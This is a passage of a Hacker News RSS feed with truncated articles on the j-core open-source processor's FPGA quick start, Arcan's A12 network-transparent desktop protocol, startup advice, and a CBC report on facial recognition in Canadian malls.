game console) was, and the last sh2 patent expired in October 2014.
The sh4 processor (dreamcast) has an mmu, but the last sh4 patents don't
exire until 2016. (Update: we're probably implementing a
<href=http: lists.j-core.org="" pipermail="" j-core="" 2017-march="" 000558.html="">simpler MMU design
which will run the same userspace software but require kernel and QEMU
updates, which we'll submit upstream when ready.)</href=http:></p>

<p>J-core's design is small and simple. As open source hardware it can be
manufactured cheaply (about 3 cents per processor) and audited for NSA
backdoors or
<a href="http://www.theregister.co.uk/2015/08/12/lenovo_firmware_nasty/">vendor
backdoors</a> or
<a href="http://hothardware.com/news/researchers-discover-rootkit-exploit-in-intel-processors-that-dates-back-to-1997">exploitable firmware bugs</a>,
and allows systems built without hidden extra processors in things like
<a href="http://s3.eurecom.fr/~zaddach/docs/Recon14_HDD.pdf">storage devices</a>
and <a href="http://arstechnica.com/security/2014/07/this-thumbdrive-hacks-computers-badusb-exploit-makes-devices-turn-evil/">USB controllers</a>
easily repurposed into spyware.</p>

<p>The <a href="http://lists.j-core.org/">j-core mailing
list</a> is the best place for further information or to ask questions.</p>

<a name="quick">
<h3>Quick start on hardware</h3>

<p>The theory is you flash a "bitstream" file into an FPGA board's onboard
SPI flash to configure the FPGA to act like a j2 processor. This
bitstream includes a small bootloader that attempts to load a file called
"vmlinux" from an sd card, providing a linux kernel with root filesystem
in initramfs using a serial console.</p>

<p>To do this, you need an FPGA board, microsd card, bitstream, vmlinux
file with bundled initramfs, an sdcard writer, and a computer with a
USB connection (to write the SPI flash and connect to the serial console;
we used a Linux laptop but macs work too).</p>

<h4 id="get_hardware">1) Get some hardware.</h4>
</a><ul><a name="quick">
</a><li><a name="quick"></a><p><a name="quick"><strong>Numato</strong>:
The cheapest usable FPGA development board ($50 US) the j2 build system
currently targets is the
</a><a href="http://numato.com/fpga-boards/xilinx/spartan6/mimas-v2-spartan-6-fpga-development-board-with-ddr-sdram.html">Numato Mimas v2</a>
(also available <a href="http://www.amazon.com/Numato-Mimas-Spartan-Development-Board/dp/B00RL7FCQW">on amazon</a>).
It contains a Xlinux "Spartan 6" LX9 FPGA that can run a J2 at 50mhz,
64 megs of SDRAM, USB2 mini-B, and a micro-sd card slot.</p>

<p>You will probably also need a USB mini-B cable (the kind playstation
controllers use, not the kind android phones use), a
<a href="http://www.amazon.com/s/?keywords=usb+sd+card+adapter">USB microsd
card adapter</a>, and a blank microsd card. The Numato has a builtin USB serial
converer, so its "serial port" is already USB. (This USB port can also power
the board, and Numato provides a python script that writes
bitstreams to the onboard SPI flash through it. Alas it's also hardwired
to operate at 19200 bps (there's a
<a href="http://langster1980.blogspot.com/2016/06/linux-on-mimas-v2.html">firmware
update to 115200</a> but numato
<a href="https://community.numato.com/threads/how-download-a-firmware-from-linux.130/">only provides a windows tool</a> to update it.)</p>
</li>
</ul>

<p>The main downsides of the Numato board (other than the slow serial port)
are that it doesn't have ethernet, and it can't do SMP. (A single instance
of the processor with the cache disabled takes up about 60% of an LX9's
capacity.) So as an upgrade we're working on the
<a href="https://www.j-core.org/turtle">Turtle Board</a>.</p>

<p>(J-core's early development was done on an
<a href="https://www.avnet.com/shop/us/p/kits-and-tools/development-kits/avnet-engineering-services-ade--1/aes-s6mb-lx9-g-3074457345628965461">avnet
microboard</a> but that's more expensive and doesn't have a built-in sdcard
reader, so needs an add-on board to boot Linux. You can find
<a href="https://tingcao.wordpress.com/category/lx9-microboard/">more
about that board here</a>. If you want to port j-core
to other FPGA boards, ask on the mailing list and we'll describe how or
write up more docs.)</p>

<p>The rest of this page describes using the Numato board.</p>

<h4 id="download_bitstream">2) Get/install a bitstream.</h4>

<p>The point of open hardware is that you can build a bitstream from
the VHDL source code, but for your initial smoketesting you probably
want to grab <a href="https://www.j-core.org/downloads/binaries/mimas_v2.bin">a known working
binary</a> and install that first.</p>

<p>To build your own bitstream from VHDL source:</p>

<ul>
<li><a href="https://www.j-core.org/bitcomp.html">Install the Xilinx
bitstream compiler</a></li>
<li><a href="http://landley.net/aboriginal/bin/cross-compiler-sh2elf.tar.gz">Install the sh2 bare metal compiler</a> (to build the ROM bootloader).
It doesn't require a specific install location, you can extract it into
your home directory if you like.</li>
<li>Download
the <a href="https://www.j-core.org/downloads/source/jcore-source-latest.tar.gz">latest
bitstream source</a></li>
<li>Enter xilinx context and add the cross-compiler-sh2elf/bin directory to
your $PATH so sh2elf-cc and friends are available, and cd into the bitstream
source directory.</li>
<li>Fix the toolchain prefix with: <code>sed -i 's/sh2-elf-/sh2elf-/g' $(grep -rl sh2-elf- .)</code>
[TODO: check this in]</li>
<li>Run <code>make mimas_v2</code>. (Other targets are available under targets/boards.)</li>
<li>Your bitstream should wind up in <code>output/*/mimas_v2.bin</code>. [TODO: why the
date directory? That's not how package builds work, have output, overwrite
output when you rebuild. And make clean not deleting this? Really?]</li>
</ul>

<p>The reason the bare metal compiler is different from the
<a href="http://landley.net/aboriginal/bin/cross-compiler-sh2eb.tar.gz">sh2
Linux compiler</a> (other than not containing a C library) is different
function prefixes. Since low level code like the ROM bootloader (which runs
when the processor starts up and loads vmlinux off the sdcard) is written
in assembly, it manually refers to prefixed function names. Although there
is a command line option to change the prefixes, the compiler contains library
code (such as libgcc.a) that has to match the calling conventions of the
rest of the code.</p>

<h4 id="flash_bitstream">3) Flash the bitstream to the board.</h4>

<p>Numato
<a href="https://github.com/numato/samplecode/raw/master/FPGA/MimasV2/tools/configuration/python/MimasV2Config.py">provides</a>
a GPL-licensed python3 tool to flash bitstreams onto their board.
[TODO: port to python 2]</p>

<p>To use it:</p>
<ul>
<li>Nobody ever has python 3 installed, so:
<code>apt-get install python3 python3-serial</code></li>
<li>Flip the black switch on the board (between the VGA and USB ports)
towards the USB side. This is the "flash" position.</li>
<li>Connect the board to your Linux box with a USB mini-B cable. (The
kind playstation controlers use, not the kind android phones use.)</li>
<li><code>sudo python3 MimasV2Config.py /dev/ttyACM0 mimas_v2.bin</code></li>
<li>Flip the switch back towards the VGA side. This is the "boot" position.</li>
</ul>

<p>The above assumes the Numato serial port shows up as <code>/dev/ttyACM0</code>,
which is almost always the case.</p>

<p>Note: <strong>Ubuntu 14.04</strong> decided that any serial device plugged into
a post-2014 computer MUST be a modem (a type of hardware used with telephone
land lines back in the 20th century), and have a hotplug daemon send
random AT commands at any new serial device, which confuses the Numato
firmware loader. If you are not particpating in the Great Modem Revival,
you need to <code>sudo service modemmanager stop</code>.
See <a href="http://community.numato.com/threads/solved-mimas-v2-programming-in-linux.15/page-2#post-186">here</a> for details.</p>

<h4 id="serial">4) Hook up a serial console.</h4>

<p>Nomato's serial port implementation only connected data send and receive
lines, meaning it doesn't provide hardware flow control. This confuses terminal
programs that expect RTS and CTS (let alone DTR or DSR). We can use the stty
tool to tell Linux not to care, then use a simple terminal program that
won't try to fiddle with this itself.</p>

<p>Since the <code>/dev/ttyACM0</code> device goes away each time you unplug and
replug the USB cable (which conveniently power cycles the board),
we can combine these two commands into a single command line in the ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.j-core.org/index.html">https://www.j-core.org/index.html</a></em></p>]]>
            </description>
            <link>https://www.j-core.org/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24934474</guid>
            <pubDate>Thu, 29 Oct 2020 19:20:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A12 ‚Äì Advancing Network Transparency on the Desktop]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24934296">thread link</a>) | @todsacerdoti
<br/>
October 29, 2020 | https://arcan-fe.com/2020/10/28/a12-advancing-network-transparency-on-the-desktop/ | <a href="https://web.archive.org/web/*/https://arcan-fe.com/2020/10/28/a12-advancing-network-transparency-on-the-desktop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<p>This article is is the main course to the appetiser that was <a href="https://arcan-fe.com/2018/11/16/the-x-network-transparency-myth/">The X Network Transparency Myth</a> (2018). In it, we will go through how the pieces in the Arcan ecosystem tie together to advance the idea of network transparency for the desktop and how it sets the stage for a fully networked desktop.</p>



<p>Some of the points worth recalling from the X article are:</p>



<ol><li>‚Äòtransparency‚Äô is evaluated from the perspective of the user; it is not even desirable for the underlying layers to be written so that they operate the same for local rendering as they would across a network. The local-optimal case is necessarily different from the remote one, the mechanisms are not the same and the differences will keep on growing organically with the advancement of hardware and display/rendering techniques.</li><li>side-band protocols splitting up the desktop into multiple IPC systems for audio, meta, fonts, ‚Ä¶ increases the difficulty to succeed with anything close to a transparent experience, as the network layer needs to take all of these into consideration as well as trying to synchronise them.</li></ol>



<p>To add a little to the first argument: it should also not be transparent to the window manager as some actions have drastically different impact on the user interface side to security and expectations. For example, Clipboard/DND locally is not (supposed to be) a complicated thing. When applied across a network, however, such things can degrade the experience for anything else. Other examples is that you want to block some sensitive inputs from being accidentally forwarded to a networked window and so on, it has happened in the past that the wrong sudo password has, indeed, been sent to the wrong ssh session.</p>



<p>This target has been worked on for a long time, as suggested by this part from the <a href="https://www.youtube.com/watch?v=3O40cPUqLb">old demo</a> from 2012/2013. Already back then the drag/slice to compose-transform-and-share case exposed out of compositor sharing and streaming; something that only now is appearing elsewhere in a comparably limited form.</p>



<p>We are on the third or fourth re-implementation of the idea, and the first one that is considered having a good enough of a design to commit to using and building upon. There are many fascinating nuances to this problem that only appear when you ‚Äòtry to go to 11‚Äô.</p>



<p>As per usual, parts of this post will be quite verbose and technical. Here are some shortcuts to jump around so that you don‚Äôt lose interest from details that seem irrelevant to you.</p>



<ul><li><a href="#primitives">Basic primitives: Arcan-net, A12 and SHMIF</a></li><li><a href="#usecases">Example Usecases</a></li><li><a href="#protocol">Protocol State and Development</a></li><li><a href="#explained">Demo Explained</a></li></ul>



<h2 id="demo">Demos</h2>



<p>Starting with some short clips of the development progress ‚Äì and then work through the tools and design needed to make this happen. It might be short, but there is a whole world of nuance and detail to it.</p>



<p>(~early 2019) ‚Äì forced compression, OSX viewer, (bad) audio:</p>



<figure></figure>



<p>Composited Xarcan (desktop to pinephone), compression based on window type:</p>



<figure><p><span><iframe width="640" height="360" src="https://www.youtube.com/embed/CIWZdEkgPfM?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span>
</p></figure>



<p>Here is a native arcan client with crypto, local GPU ‚Äúhot-unplug‚Äù to software rendering handover and compression negotiation (h264):</p>



<figure><p><span><iframe width="640" height="360" src="https://www.youtube.com/embed/_RSvk7mmiSE?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span>
</p></figure>



<p>Here is ‚Äòserver-side‚Äô text rendering of text-only windows, font, style and size controlled by presenting device ‚Äî client migrates back when window is closed:</p>



<figure></figure>



<p><span>In the videos, you can see (if you squint) instances of </span><em>live migration</em><span> between display servers over a network, with a few twists. For example, the decorations, input mapping, font preferences and other visuals change to match the machine that the client is currently </span><em>presenting</em><span> on and that audio also comes along, because </span><a href="https://arcan-fe.com/2017/10/05/awk-for-realtime-multimedia/">Arcan does multimedia</a><span>, not only video. </span></p>



<p><span>What is less visible is that the change in border colour, a security feature in </span><a href="http://durden.arcan-fe.com/">Durden</a><span>, is used to signify that the window comes from a networked source, a property that can also be used to filter sensitive actions. The neo-vim window in the video even goes so far as to have its text surfaces rendered server side, as its </span><a href="https://github.com/letoram/nvim-arcan">UI driver</a><span> is written using our terminal-protocol liberated </span><a href="https://github.com/letoram/arcan/wiki/TUI">TUI API.</a> This is also why the font changes; it is the device you&nbsp;<em>present</em> on that defines visuals and input response, not the device you run the program on.</p>



<p>Also note how the clients ‚Äújumps‚Äù back when the window is closed on the remote side; this is one of the many payoffs from having a systemic mindset when it comes to&nbsp; ‚Äò<a href="https://arcan-fe.com/2017/12/24/crash-resilient-wayland-compositing/">crash resilience</a>‚Äò ‚Äì the IPC system itself is designed in such a way that <em>necessary</em> state can b<span>e reconstructed and&nbsp;</span><em>dynamic</em><span>&nbsp;state is tracked and renegotiated when needed. The effect is that a client is forcefully detached from the current display server with the instruction of switching to another.</span> The keystore (while a work in progress) allows you to define the conditions for when and how it jumps to which machines and picks keys accordingly.</p>



<p>That dynamic state is tracked and can be renegotiated as a ‚Äòreset‚Äô matters on the client level as well, the basic set of guaranteed features when a client opens a local connection roughly generalises between all imaginable window management styles. Those that are dynamically (re-) negotiated cannot be relied upon. So when a client is migrated to a user that has say, accessibility needs, or is in a <a href="https://arcan-fe.com/2018/03/29/safespaces-an-open-source-vr-desktop/">VR environment</a>, the appropriate extras gets added when the client connects there, and then removed when it moves somewhere else. This is an essential primitive for network transparency as a collaboration feature.</p>



<h2 id="primitives">Basic Primitives: Arcan-net, SHMIF and A12</h2>



<p>There are three building blocks in play here, a tool called <em>arcan-net&nbsp;</em>which combines the two others:&nbsp;<em>A12</em> and <a href="https://github.com/letoram/arcan/wiki/SHMIF">SHMIF</a>.</p>



<p>A12 is a <span>‚Äòwork in progress‚Äô protocol ‚Äì it‚Äôs not </span><em>the</em><span>&nbsp;</span><a href="https://www.x.org/wiki/Development/X12/">X12</a><span> that some people called for, but it‚Äôs ‚Äú</span><em>a‚Äù</em><span> twelve. It strives to be remote optimal ‚Äì compression tactics based on connectivity, content type and context of use, deferred (presentation side) rendering with data-native representation when possible (pixel buffers as a last resort, not the default); support caching of common states such as fonts; handle cancellation of normally ‚Äòatomic‚Äô operations such as clipboard cut and paste and so on.</span></p>



<p>SHMIF is the IPC system and API used to work with most other parts of Arcan. It is designed to be locally optimal: shared memory and system ABI in lock free ring-buffers preferred over socket/pipe pack/unpack transfers; minimal sustained set of system calls needed (for least-privilege sandboxing); resource allocations on a strict regimen (DoS prevention and exploit mitigation); fixed based set of necessary capabilities and user-controlled opt-in for higher level ones.</p>



<p><span>SHMIF has a large number of features that were specifically picked for correcting the wrongs done to X- like network transparency by the gradual introduction of side-bands and good old fashioned negligence. Part of this is that <em>all necessary and sufficient data exchange</em> used to compose a desktop goes over <em>the same</em> IPC system ‚Äî one that is free of unnecessary Linuxisms to boot. While it would hurt a bit and take some effort, there are few stops for packing our bags and going someplace else, heck it used to run on Windows and still works on OSX. Rumour has it there are iOS and Android versions hidden away somewhere.</span></p>



<p><span>Contrast this with other setups where you need a large weave of IPC systems to get the same job done; Wayland for video and some input and some metadata; PulseAudio for audio; PipeWire for some video and some audio; D-Bus for some metadata and controls; D-Conf for some other metadata; Spice/RFB(VNC)/RDP for composited desktop sharing; Waypipe for partial Wayland sharing, X11 for partial X / XWayland sharing: SSH+VT***+Terminal emulator for CLI/TUI and less unsafe Waypipe / X11 transport; Synergy for mouse and keyboard and clipboard and so on. Each of these with their own take (or lack thereof) on authentication and synchronization, implementing many of the most difficult tasks again and again in incompatible ways yet still end up with features missing and exponentially more lines of code when compared to the solution here.</span></p>



<p>Back to Arcan-net. It exposes an a12 server and an a12 client, as well as acting as a shmif server, a shmif client and taking care of managing authentication keys. In that sense it behaves like any old network proxy. While not going too far into the practical details, showing off some of the setup might help.</p>



<p>On the active display server side:</p>



<pre>void@123.213.132.1# arcan-net -l 31337</pre>



<p>This will listen for incoming connections on the marked port, and map them to the currently active local connection point. <span>To dive further into the connection point concept, either read the comparison between </span><a href="https://arcan-fe.com/2018/10/17/arcan-versus-xorg-approaching-feature-parity/">Arcan vs Xorg</a><span> or simply think ‚ÄòDesktop UI address‚Äô; The WM exports named connection points and assigns different policies based on that.</span></p>



<p><span>On the client side we can have the complex-persistent option that forwards new clients as they come:</span></p>



<pre><em>arcan-net</em> -s <em>netdemo</em> <em>123.213.132.1 31337</em><br>ARCAN_CONNPATH=netdemo one_arcan_client &amp;<br>ARCAN_CONNPATH=netdemo another_arcan_client &amp;</pre>



<p>Or the one-time simpler version which forks/exec arcan-net and inherits the connection primitive needed to setup a SHMIF connection:</p>



<pre>ARCAN_CONNPATH=a12://keyid@host:port one_arcan_client</pre>



<p>Or, and this is important for understanding the demo, an api function through the WM:</p>



<pre>target_devicehint(client_vid,"a12://keyid@", true)</pre>



<p>This triggers the SHMIF implementation tied to the window of a client to disconnect from the current display server connection, connect to a remote one through arcan-net, then tell the application part of the client to rebuild essential state as the previous connection has, in a sense, ‚Äòcrashed‚Äô. The same mechanism is then used to define a fallback (‚Äòshould the connection be lost, go here instead‚Äô). This is the <em>self-healing</em> aspect of proper <em>resilience</em>.</p>



<p>There are WM APIs for all the possible network sharing scenarios so it can be handled as user interfaces without any command line work.</p>



<p>I mentioned ‚Äòauthentication‚Äô before, where is that happening? So this is another part of the ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://arcan-fe.com/2020/10/28/a12-advancing-network-transparency-on-the-desktop/">https://arcan-fe.com/2020/10/28/a12-advancing-network-transparency-on-the-desktop/</a></em></p>]]>
            </description>
            <link>https://arcan-fe.com/2020/10/28/a12-advancing-network-transparency-on-the-desktop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24934296</guid>
            <pubDate>Thu, 29 Oct 2020 19:07:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Great Business: Advice You Won't Take (and Will Regret Not Taking)]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24934026">thread link</a>) | @rjyoungling
<br/>
October 29, 2020 | https://www.younglingfeynman.com/essays/advice | <a href="https://web.archive.org/web/*/https://www.younglingfeynman.com/essays/advice">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-ba050bc6dcf9223f8459"><div><p>A while ago, I was talking to a founder of a startup. We were talking about his experience before and after finding product/market fit.</p><p>I asked him if he could boil down his experience into 1 piece of important advice I could share with The Younglings. He did.</p><p>But it was the way he said it, rather than what he said, that stuck with me.</p><p><em>His answer, because I don‚Äôt wanna leave you hanging, was that ‚Äòyou will overbuild and it will be a mistake‚Äô.</em></p><p>The way he said it was: ‚ÄòIt is impossible to follow this advice but‚Ä¶‚Äô</p><p>That made me think of the advice I could give that I know is impossible to take yet true. The result of that is the essay you‚Äôre reading right now.</p><p><em>The irony that this essay is a list is not lost on me. My hatred for superficial business insider listicles has become a running joke. That said, I think this will be a worthwhile exception.</em></p><p>Let‚Äôs get right into it.</p><p>If you‚Äôre extremely ambitious, the prospect of the ‚Äòdisruptive innovation‚Äô of an industry can seem daunting. Where do you even start?</p><p>I am not a big fan of TAM at all. VC‚Äôs (and other investors) are biased. They‚Äôll give you self-serving advice. They want you to think big.</p><p><em>More on TAM in: </em><a href="https://www.younglingfeynman.com/essays/tam" target="_blank"><em>Should You Worry About TAM And SAM?</em></a></p><p>Why? Because they don‚Äôt care about you as an individual. You‚Äôre fungible. As long as of the 100 investments they make, a few become unicorns, that‚Äôs perfectly fine!&nbsp;</p><p>While I do think there‚Äôs a good case to be made for thinking big and solving the hardest problems on the planet, it‚Äôs actually incredibly rare for a founder to start there.</p><p>Take Elon Musk, for example. Tesla, SpaceX, The Boring Company, Neuralink, etc. All incredibly ambitious.</p><p>But his first company? A videogame when he was in his early teens. His first startup? A precursor to Google maps.&nbsp;</p><p>That‚Äôs all much more doable.</p><p>He even said in an interview that he probably wouldn‚Äôt have been able to start with SpaceX and that he advises against starting with a company that is that capital intensive.&nbsp;</p><p><em>I‚Äôve been unable to find the source. I‚Äôll continue to search for the video on YouTube and I‚Äôll add it to the references if I find it.</em></p><p>In fact, I don‚Äôt know of a single founder that started their company with this huge vision. What usually happens is lying. Founders (or PR) will whitewash their history ex-post facto.</p><p>Something that <a href="https://mashable.com/article/mark-zuckerberg-lying-about-facebook/?europe=true" target="_blank">Zuckerburg was recently called out</a> for.</p><p>The Collinson brothers have often <a href="https://www.youtube.com/watch?v=9DUQ7_7Pj_c" target="_blank">pointed out that had they known Stripe would‚Äôve been this hard, they might not have started it at all</a>.</p><p>So to come back to my question in the first paragraph, where do you even start?</p><p>With 1 person. You!&nbsp;</p><p>Think about a problem you have. Or think about something that you really want to see in the world.</p><p>Then try to see if there are other people like you.&nbsp;</p><p>Forget about scale. Forget about world domination. Forget about Fortune lists.&nbsp;</p><p>Focus on your tiny audience and just build something that improves their lives. According to them, not according to you.&nbsp;</p><p>Get to a point where they love it. Get to a point where they would be deeply sad if your solution went away.</p><p><em>More on architecting user love in: </em><a href="https://www.younglingfeynman.com/essays/deeplove" target="_blank"><em>Do You Have Customers Who Deeply Love You?</em></a></p><p><em>In case you‚Äôre suffering from a restless, intellectual brain that just can‚Äôt stop asking: ‚ÄòBut how do I scale?‚Äô, the answer is: ‚ÄòKeep finding more people‚Äô. How much you make people‚Äôs lives better (on the X-axis) multiplied by a lot of people (on the Y-axis), is what‚Äôll create a large business.</em></p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1592418092968_20301"><div><p><em>Avoid the red bar, and start with the bright blue bar. Even if your company is already creating revenue, you might not have that bright blue bar‚Ä¶ a small set of raving fans that absolutely love your product. Then grow that bright blue bar along the Y-axis. In theory, you could also grow the red bar along the X-axis to get the same surface area. In practice that never works out.</em></p><p>There are a small number of ‚Äònon-obvious, capital intensive startups‚Äô (to borrow <a href="https://en.wikipedia.org/wiki/Chamath_Palihapitiya" target="_blank">Chamath</a>‚Äôs lexicon).&nbsp;</p><p>In those cases, you probably can‚Äôt be profitable from the beginning.&nbsp;</p><p><em>Unless you‚Äôre very creative and have a long time horizon. For example, one might have been able to start Tesla by starting Boosted Boards, then launching into new categories until you eventually get to cars. Dyson did a similar thing from vacuums to hand dryers to fans to blow dryers to cars. </em><a href="https://www.bbc.com/news/business-50004184" target="_blank"><em>Unfortunately, they‚Äôve announced they‚Äôre pulling out</em></a><em>.</em></p><p>But I believe most small businesses and startups should be profitable from the beginning and scale or hover just below profitability.</p><p>It‚Äôs a mistake to solely focus on growth in hopes of one day pulling the magical profitability lever and suddenly being profitable.</p><p>Hope makes for a poor business strategy and the reason you hear about Google is that it‚Äôs so rare. More often than not it just doesn‚Äôt work out. [1]</p><p>If you do decide to put growth over profitability, you should know your numbers and be clearly able to articulate why it‚Äôs a good idea.</p><p>I‚Äôd rather see a Lambda School than a Homejoy.</p><p><em>Austen raised after being profitable (= knowing his LTV, CAC, churn etc.) in order to fund faster growth and compress the timeline. Adora raised while not knowing exactly what LTV and CAC would end up being. Although there are always many factors, the biggest one was that acquiring customers was too expensive and they had poor retention. This obviously doesn‚Äôt mean Austen is better than Adora. Adora is a legend and she added many leaves to the tree of entrepreneurial science. It just means that Adora took a more risky approach and that has a smaller chance of working out.</em></p><p>You know who obsessively focuses on the competition? People that have run out of ideas.</p><p>If you:</p><ol data-rte-list="default"><li><p>Have a clear grasp of what fucking sucks in this world.&nbsp;</p></li><li><p>A good solution for fixing it.&nbsp;</p></li><li><p>And, a group of people that love your product,</p></li></ol><p>then that‚Äôll take up all of your time.</p><p>Obviously, the competition sucks otherwise the problem or the need wouldn't exist. They would‚Äôve solved it. [2]</p><p>Correctly identifying a real problem, or a need that a certain audience has as well, and then building a solution that they love, is already hard enough.</p><p>Trying to simultaneously focus on what the competition is doing (or even worse, might do) is near impossible. [3]</p><p>If you're doing your job correctly, you‚Äôll hear what the competition is up to anyway. But if that heavily affects your decision-making process, you‚Äôre doing it wrong.</p><p><em>1 important exception to this is if your company relies mainly on psychological innovation. Oatly struggled even though they had a great product. It wasn‚Äôt until </em><a href="https://thechallengerproject.com/blog/2016/oatly" target="_blank"><em>they brought in a guy with the necessary expertise in psychological innovation</em></a><em> (John Schoolcraft) that they were able to scale. He realized that they were mimicking the competition and by looking at what they were doing, he could make sure Oatly steered clear of that and develop its own voice.</em></p><p><em>More on psychological innovation in this essay series: </em><a href="https://www.younglingfeynman.com/essays/illogical" target="_blank"><em>Why Your Business Needs More Weird Ideas</em></a><em>.</em></p><p>Young companies don‚Äôt get killed by big companies. They fail to follow point 1 on this list. They make something mediocre, or they solve a problem that doesn‚Äôt exist, or they build something to address a need that no one has.</p><p>When Jack Dorsey built Twitter, he wasn‚Äôt solving a problem. He was addressing a need‚Ä¶ his own. It‚Äôs possible that in an alternate but nearly identical universe, he is an outlier and people just aren‚Äôt that into Twitter.&nbsp;</p><p>But as it so happens, his colleagues at <a href="https://www.businessinsider.com/how-twitter-was-founded-2011-4?international=true&amp;r=US&amp;IR=T" target="_blank">Odeo</a> loved it and it started to spread.</p><p>Keep iterating your business model canvas, or pivot, until you've succeeded in making a product that makes people bang down your door to get it. [4]</p><p>To quote Andy Rachleff (created modern product/market fit theory inspired by Don Valentine):</p><blockquote><p>‚Äò[‚Ä¶]if you‚Äôre really good at execution but the dogs don‚Äôt want to eat the dog food, you have no chance of winning.‚Äô</p></blockquote><p>I thought it would be nice to end this list on the advice that kicked it off.</p><p>Get your idea into the hands of users as quickly as humanly possible. Your brain is lying to you when it tells you that the first impression should be polished and amazing and that Reid Hoffman is wrong when he says:</p><blockquote><p>‚ÄòIf you‚Äôre not embarrassed by the first version of your product, you‚Äôve launched too late!‚Äô</p></blockquote><p>Remember that your brain is wrong in this case. It‚Äôs your friend, but like an overprotective mom, it doesn‚Äôt want you to get hurt. So it‚Äôll try to trick you (successfully I might add) that you should do anything except the things that actually matter.</p><p>This is the core insight of Noah Kagan‚Äôs eminent <a href="https://www.youtube.com/watch?v=BwbtSPQ8jAY" target="_blank">Validation Theory</a>.</p><p>The reason why you shouldn‚Äôt overbuild is because you‚Äôre making a lot of assumptions, and nearly all of those assumptions are wrong.</p><p>The quicker you‚Äôre able to identify which ones are wrong the better because it‚Äôll save resources.</p><p>Imagine spending 6 years and $500K engineering a $3500 robot that walks dogs and picks up dog poop. When you try to sell it you learn ‚Äòain‚Äôt nobody wanna spend $3.5K on your dog walking pooper scooper‚Äô. You could‚Äôve avoided this by presenting a few people with your idea and ask them to prepay. When you inevitably hear: ‚Äòyeah‚Ä¶ uhm, that‚Äôs gonna be a hard pass for me chief!‚Äô, then you can iterate to something that would be <strong>excited</strong> to pay for.</p><p>Don‚Äôt feel bad about ignoring the advice on this list. While everything is true, your brain will find some excuse and you will buy into it. We all do, myself included.</p><p>This seems to be like parents warning you about a bad girl/boy when you‚Äôre a teenager. You just need to experience it before it sinks in.</p><p>Then why did I write this essay?</p><p>Because part of me hopes there are a few competitive people that‚Äôll be like: ‚ÄòDon‚Äôt tell me what I can‚Äôt do!‚Äô</p><p>And for the rest of the people reading this, when you make these mistakes, I hope you‚Äôre able to recognize that you‚Äôre making them sooner and are able to course-correct faster.</p><p><em>[1] Again, be mindful of who gives you this advice. VC‚Äôs most likely. For them, it‚Äôs a win/win situation. If they give you an A round and push you to grow hard, your paper valuation will increase, they can use that to raise more capital. That means they‚Äôll make more money because of their management fee.&nbsp;</em></p><p><em>T‚Ä¶</em></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.younglingfeynman.com/essays/advice">https://www.younglingfeynman.com/essays/advice</a></em></p>]]>
            </description>
            <link>https://www.younglingfeynman.com/essays/advice</link>
            <guid isPermaLink="false">hacker-news-small-sites-24934026</guid>
            <pubDate>Thu, 29 Oct 2020 18:47:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft releases preview of Lobe training app for machine-learning]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24933975">thread link</a>) | @mrafiee
<br/>
October 29, 2020 | https://www.lobe.ai/tour | <a href="https://web.archive.org/web/*/https://www.lobe.ai/tour">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.lobe.ai/tour</link>
            <guid isPermaLink="false">hacker-news-small-sites-24933975</guid>
            <pubDate>Thu, 29 Oct 2020 18:44:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mall real estate company collected 5M images of shoppers]]>
            </title>
            <description>
<![CDATA[
Score 259 | Comments 173 (<a href="https://news.ycombinator.com/item?id=24933583">thread link</a>) | @voisin
<br/>
October 29, 2020 | https://www.cbc.ca/news/politics/cadillac-fairview-5-million-images-1.5781735?cmp=rss | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/politics/cadillac-fairview-5-million-images-1.5781735?cmp=rss">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The real estate company behind some of Canada's most popular shopping centres embedded cameras inside its digital information kiosks at 12 shopping malls in major Canadian cities&nbsp;to collect millions of images ‚Äî and used facial recognition technology without customers' knowledge or consent ‚Äî&nbsp;according to a new investigation by the federal, Alberta and B.C. privacy commissioners.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5499879.1584406507!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/covid-19-pandemic-stores-closed.JPG"></p></div><figcaption>Cadillac Fairview, the real estate company behind some of Canada's most popular shopping centres, embedded cameras inside its digital information kiosks at 12 shopping malls across Canada, according to a new investigation.<!-- --> <!-- -->(Evan Mitsui/CBC)</figcaption></figure><p><span><p>The real estate company behind some of Canada's most popular shopping centres embedded cameras inside its digital information kiosks at 12 shopping malls in major Canadian cities&nbsp;to collect millions of images ‚Äî and used facial recognition technology without customers' knowledge or consent ‚Äî&nbsp;according to a new investigation by the federal, Alberta and B.C. privacy commissioners.</p>  <p>"Shoppers had no reason to expect their image was being collected by an inconspicuous camera, or that it would be used, with facial recognition technology, for analysis," said federal Privacy Commissioner Daniel Therrien&nbsp;in a statement.</p>  <p>"The lack of 